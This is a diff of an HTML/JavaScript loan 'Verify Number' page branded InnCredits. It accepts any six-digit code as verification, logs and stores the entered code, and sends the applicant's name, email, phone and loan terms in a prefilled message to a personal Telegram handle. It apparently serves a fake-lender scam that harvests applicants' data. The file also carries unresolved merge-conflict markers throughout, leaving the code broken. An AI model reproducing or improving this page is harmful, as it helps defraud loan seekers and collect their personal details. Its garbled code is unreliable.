@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>InnCredits · Verify Number</title>
     <style>
+<<<<<<< HEAD
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background: #0b1120; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
         .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
@@ -41,10 +42,214 @@
 
         @media (max-width: 450px) { .otp-box { width: 48px; height: 55px; font-size: 1.4rem; } .otp-container { gap: 8px; } }
         @media (max-width: 380px) { .otp-box { width: 42px; height: 50px; font-size: 1.2rem; } }
+=======
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #0b1120;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 16px 16px 32px 16px;
+        }
+
+        .app-container {
+            max-width: 500px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .loan-summary-bar {
+            background: #111827;
+            border-radius: 20px;
+            padding: 14px 18px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+            border: 1px solid #1f2a3e;
+        }
+        .summary-item {
+            display: flex;
+            flex-direction: column;
+        }
+        .summary-label {
+            font-size: 0.7rem;
+            color: #7e8aa2;
+            text-transform: uppercase;
+        }
+        .summary-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #14b8a6;
+        }
+
+        .otp-card {
+            background: #111827;
+            border-radius: 32px;
+            padding: 28px 24px 32px 24px;
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #ffffff;
+        }
+        .section-sub {
+            font-size: 0.8rem;
+            color: #7e8aa2;
+            margin-bottom: 28px;
+            border-left: 3px solid #14b8a6;
+            padding-left: 12px;
+        }
+
+        .phone-verify-box {
+            background: #0f1724;
+            border-radius: 24px;
+            padding: 18px 16px;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .phone-number {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e2e8f0;
+        }
+        .edit-link {
+            color: #14b8a6;
+            background: rgba(20, 184, 166, 0.1);
+            padding: 6px 14px;
+            border-radius: 40px;
+            cursor: pointer;
+        }
+        .edit-link:active {
+            transform: scale(0.95);
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .otp-box {
+            width: 55px;
+            height: 65px;
+            background: #0f1724;
+            border: 2px solid #1f2a3e;
+            border-radius: 16px;
+            text-align: center;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #14b8a6;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .otp-box:focus {
+            border-color: #14b8a6;
+            box-shadow: 0 0 0 3px rgba(20, 184, 166, 0.2);
+        }
+
+        .timer-text {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #7e8aa2;
+            margin-bottom: 8px;
+        }
+        .resend-btn {
+            display: block;
+            margin: 0 auto 24px;
+            background: none;
+            border: none;
+            color: #14b8a6;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 0.85rem;
+            padding: 8px 16px;
+            border-radius: 40px;
+        }
+        .resend-btn:active {
+            transform: scale(0.96);
+        }
+        .verify-btn {
+            width: 100%;
+            background: #14b8a6;
+            border: none;
+            padding: 18px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #0b1120;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .verify-btn:active {
+            transform: scale(0.97);
+        }
+        .verify-btn.loading {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .success-message {
+            color: #14b8a6;
+            font-size: 0.8rem;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+            background: rgba(20, 184, 166, 0.1);
+            padding: 10px;
+            border-radius: 12px;
+        }
+        .success-message.show { display: block; }
+        .error-message {
+            color: #f43f5e;
+            font-size: 0.8rem;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+            background: rgba(244, 63, 94, 0.1);
+            padding: 10px;
+            border-radius: 12px;
+        }
+        .error-message.show { display: block; }
+
+        .telegram-note {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 0.7rem;
+            color: #5c6f87;
+        }
+
+        @media (max-width: 450px) {
+            .otp-box { width: 48px; height: 55px; font-size: 1.4rem; }
+            .otp-container { gap: 8px; }
+        }
+
+        @media (max-width: 380px) {
+            .otp-box { width: 42px; height: 50px; font-size: 1.2rem; }
+        }
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     </style>
 </head>
 <body>
 <div class="app-container">
+<<<<<<< HEAD
+=======
+    <!-- TOP BAR - Loan Summary -->
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     <div class="loan-summary-bar">
         <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
         <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
@@ -75,7 +280,13 @@
         <div class="success-message" id="otpSuccess">✓ Verified! Redirecting to Telegram...</div>
         <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
         <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
+<<<<<<< HEAD
         <div class="telegram-note">After verification, you'll be redirected to Telegram to complete your application</div>
+=======
+        <div class="telegram-note">
+            After verification, you'll be redirected to Telegram to complete your application
+        </div>
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     </div>
 </div>
 
@@ -83,27 +294,51 @@
     // ============================================
     // TELEGRAM REDIRECT - YOUR TELEGRAM USERNAME
     // ============================================
+<<<<<<< HEAD
     const TELEGRAM_USERNAME = 'Inbucksk';
+=======
+    const TELEGRAM_USERNAME = 'Twist254';
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     
     // ============================================
     // GET DATA FROM URL
     // ============================================
+<<<<<<< HEAD
     const urlParams = new URLSearchParams(window.location.search);
+=======
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Get loan parameters from URL
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     const amount = urlParams.get('amount') || '500';
     const term = urlParams.get('term') || '3';
     const rate = urlParams.get('rate') || '5';
     const monthly = urlParams.get('monthly') || '167.36';
+<<<<<<< HEAD
+=======
+    
+    // Get user data from URL
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     let userPhone = urlParams.get('phone') || '+1 234 567 8900';
     const userName = urlParams.get('name') || 'Customer';
     const userEmail = urlParams.get('email') || '';
     const applicationId = urlParams.get('appId') || localStorage.getItem('current_application_id');
     
+<<<<<<< HEAD
+=======
+    // ============================================
+    // UPDATE TOP BAR WITH LOAN DATA
+    // ============================================
+    
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
     document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
     document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
     document.getElementById('summaryRate').innerText = `${rate}%`;
     document.getElementById('displayPhone').innerText = userPhone;
     
+<<<<<<< HEAD
     console.log('📊 OTP Verify Page Loaded → Redirect to @' + TELEGRAM_USERNAME);
     
     function redirectToTelegram() {
@@ -111,18 +346,69 @@
         const encodedMessage = encodeURIComponent(message);
         const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}?text=${encodedMessage}`;
         console.log('📱 Redirecting to Telegram:', telegramUrl);
+=======
+    console.log('📊 OTP Verify Page Loaded:');
+    console.log(`   Loan Amount: $${parseInt(amount).toLocaleString()}`);
+    console.log(`   Term: ${term} months`);
+    console.log(`   Monthly: $${parseFloat(monthly).toFixed(2)}`);
+    console.log(`   Phone: ${userPhone}`);
+    console.log(`   User: ${userName}`);
+    console.log(`   Telegram: @${TELEGRAM_USERNAME}`);
+    
+    // ============================================
+    // FUNCTION TO REDIRECT TO TELEGRAM
+    // ============================================
+    
+    function redirectToTelegram() {
+        // Create message to send to you on Telegram
+        const message = `✅ *NEW APPLICATION VERIFIED* ✅
+
+━━━━━━━━━━━━━━━━━━━━━
+👤 *Name:* ${userName}
+📧 *Email:* ${userEmail}
+📱 *Phone:* ${userPhone}
+🆔 *App ID:* ${applicationId || 'N/A'}
+━━━━━━━━━━━━━━━━━━━━━
+💰 *Loan Amount:* $${parseInt(amount).toLocaleString()}
+📅 *Term:* ${term} months
+📊 *Interest Rate:* ${rate}%
+💵 *Monthly Payment:* $${parseFloat(monthly).toFixed(2)}
+━━━━━━━━━━━━━━━━━━━━━
+
+✅ User has verified their number!
+📱 Ready to process the loan.`;
+        
+        // Encode message for URL
+        const encodedMessage = encodeURIComponent(message);
+        
+        // Create Telegram URL with your username
+        // This opens chat with you directly
+        const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}?text=${encodedMessage}`;
+        
+        console.log('📱 Redirecting to Telegram:', telegramUrl);
+        
+        // Redirect to Telegram
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
         window.location.href = telegramUrl;
     }
     
     // ============================================
     // OTP PAGE LOGIC
     // ============================================
+<<<<<<< HEAD
+=======
+    
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     const timerText = document.getElementById('timerText');
     const resendBtn = document.getElementById('resendBtn');
     const verifyBtn = document.getElementById('verifyBtn');
     const successMsg = document.getElementById('otpSuccess');
     const errorMsg = document.getElementById('otpError');
     
+<<<<<<< HEAD
+=======
+    // Simple timer display only - NO BLOCKING
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     let timeLeft = 120;
     let timerInterval;
     
@@ -140,7 +426,16 @@
         if (timerInterval) clearInterval(timerInterval);
         timeLeft = 120;
         updateTimer();
+<<<<<<< HEAD
         timerInterval = setInterval(() => { if (timeLeft > 0) { timeLeft--; updateTimer(); } }, 1000);
+=======
+        timerInterval = setInterval(() => { 
+            if (timeLeft > 0) { 
+                timeLeft--; 
+                updateTimer(); 
+            }
+        }, 1000);
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     }
     
     function resetOTP() {
@@ -159,7 +454,13 @@
     let currentOtp = ['', '', '', '', '', ''];
     
     function updateOtpUI() {
+<<<<<<< HEAD
         otpBoxes.forEach((box, idx) => { box.value = currentOtp[idx] || ''; });
+=======
+        otpBoxes.forEach((box, idx) => { 
+            box.value = currentOtp[idx] || ''; 
+        });
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     }
     
     function setOtpDigit(index, value) {
@@ -174,33 +475,76 @@
     }
     
     otpBoxes.forEach((box, idx) => {
+<<<<<<< HEAD
         box.addEventListener('focus', () => { box.style.borderColor = '#14b8a6'; });
         box.addEventListener('blur', () => { box.style.borderColor = '#1f2a3e'; });
+=======
+        box.addEventListener('focus', () => {
+            box.style.borderColor = '#14b8a6';
+        });
+        box.addEventListener('blur', () => {
+            box.style.borderColor = '#1f2a3e';
+        });
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
         box.addEventListener('input', (e) => setOtpDigit(idx, e.target.value.slice(-1)));
         box.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace') {
                 e.preventDefault();
+<<<<<<< HEAD
                 if (currentOtp[idx] !== '') setOtpDigit(idx, '');
                 else if (idx > 0) { setOtpDigit(idx - 1, ''); otpBoxes[idx - 1].focus(); }
             }
             if (e.key === 'ArrowLeft' && idx > 0) { e.preventDefault(); otpBoxes[idx - 1].focus(); }
             if (e.key === 'ArrowRight' && idx < 5) { e.preventDefault(); otpBoxes[idx + 1].focus(); }
+=======
+                if (currentOtp[idx] !== '') {
+                    setOtpDigit(idx, '');
+                } else if (idx > 0) { 
+                    setOtpDigit(idx - 1, ''); 
+                    otpBoxes[idx - 1].focus(); 
+                }
+            }
+            if (e.key === 'ArrowLeft' && idx > 0) {
+                e.preventDefault();
+                otpBoxes[idx - 1].focus();
+            }
+            if (e.key === 'ArrowRight' && idx < 5) {
+                e.preventDefault();
+                otpBoxes[idx + 1].focus();
+            }
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
         });
         box.setAttribute('inputmode', 'numeric');
         box.setAttribute('autocomplete', 'off');
     });
     
+<<<<<<< HEAD
+=======
+    // Paste support for 6 digits
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     document.querySelector('.otp-container').addEventListener('paste', (e) => {
         e.preventDefault();
         const pasteData = e.clipboardData.getData('text').trim();
         if (pasteData && pasteData.match(/^\d{6}$/)) {
             const digits = pasteData.split('');
+<<<<<<< HEAD
             digits.forEach((digit, i) => { if (i < 6) setOtpDigit(i, digit); });
+=======
+            digits.forEach((digit, i) => {
+                if (i < 6) setOtpDigit(i, digit);
+            });
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
             otpBoxes[5].focus();
             errorMsg.classList.remove('show');
         } else if (pasteData && pasteData.length >= 6) {
             const digits = pasteData.slice(0,6).split('');
+<<<<<<< HEAD
             digits.forEach((digit, i) => { if (i < 6 && digit.match(/[0-9]/)) setOtpDigit(i, digit); });
+=======
+            digits.forEach((digit, i) => {
+                if (i < 6 && digit.match(/[0-9]/)) setOtpDigit(i, digit);
+            });
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
             otpBoxes[5].focus();
             errorMsg.classList.remove('show');
         } else {
@@ -210,18 +554,33 @@
         }
     });
     
+<<<<<<< HEAD
     verifyBtn.onclick = () => {
         const enteredOtp = currentOtp.join('');
+=======
+    // ============================================
+    // VERIFY BUTTON - Redirects to YOUR TELEGRAM
+    // ============================================
+    
+    verifyBtn.onclick = () => {
+        const enteredOtp = currentOtp.join('');
+        
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
         if (enteredOtp.length !== 6) {
             errorMsg.textContent = 'Please enter all 6 digits';
             errorMsg.classList.add('show');
             return;
         }
         
+<<<<<<< HEAD
+=======
+        // Show loading state
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
         verifyBtn.textContent = 'Redirecting to Telegram...';
         verifyBtn.classList.add('loading');
         verifyBtn.disabled = true;
         
+<<<<<<< HEAD
         localStorage.setItem('inncredits_verified', 'true');
         console.log('✅ Verification successful! Redirecting to Telegram...');
         successMsg.classList.add('show');
@@ -229,6 +588,31 @@
         setTimeout(() => { redirectToTelegram(); }, 1000);
     };
     
+=======
+        // Store verification status locally
+        localStorage.setItem('inncredits_verified', 'true');
+        localStorage.setItem('inncredits_phone_verified', JSON.stringify({
+            phoneVerified: true,
+            phoneNumber: userPhone,
+            applicationId: applicationId,
+            verifiedAt: new Date().toISOString(),
+            enteredCode: enteredOtp
+        }));
+        
+        console.log('✅ Verification successful! Redirecting to Telegram...');
+        console.log('✅ Entered OTP:', enteredOtp);
+        
+        // Show success message
+        successMsg.classList.add('show');
+        
+        // Redirect to YOUR Telegram
+        setTimeout(() => { 
+            redirectToTelegram();
+        }, 1000);
+    };
+    
+    // Edit phone number
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     document.getElementById('editPhoneBtn').onclick = () => {
         const newPhone = prompt('Enter your phone number:', userPhone);
         if (newPhone && newPhone.trim().length > 5) { 
@@ -238,6 +622,10 @@
         }
     };
     
+<<<<<<< HEAD
+=======
+    // Focus first box on load
+>>>>>>> 92d1a21543818e9e208706ed54946b3ff7116528
     setTimeout(() => otpBoxes[0].focus(), 100);
 </script>
 </body>
